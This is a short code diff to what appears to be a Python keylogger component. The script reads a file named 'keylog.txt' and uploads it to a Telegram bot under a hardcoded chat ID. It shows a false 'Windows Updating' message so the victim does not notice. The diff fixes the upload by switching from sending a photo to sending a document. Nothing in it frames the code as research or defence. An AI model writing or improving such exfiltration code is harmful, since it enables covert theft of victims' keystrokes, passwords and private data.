@@ -2,6 +2,7 @@ import sys
 # Add the directory where 'requests' is located
 sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')
 
+
 import telegram
 import asyncio
 
@@ -13,15 +14,15 @@ CHAT_ID = '2044432474'
 IMAGE_PATH = 'keylog.txt'  # Replace this with the actual path of your image file
 
 # Define an asynchronous function to send the image to Telegram
-async def send_image_to_telegram():
+async def send_file_to_telegram():
     bot = telegram.Bot(token=BOT_TOKEN)
     with open(IMAGE_PATH, 'rb') as file:
-        await bot.send_photo(chat_id=CHAT_ID, document=file)
+        await bot.send_document(chat_id=CHAT_ID, document=file)
     print("Windows Updating. Do not turn off computer.")
 
 # Run the asynchronous function
 def main():
-    asyncio.run(send_image_to_telegram())
+    asyncio.run(send_file_to_telegram())
 
 if __name__ == '__main__':
     main()
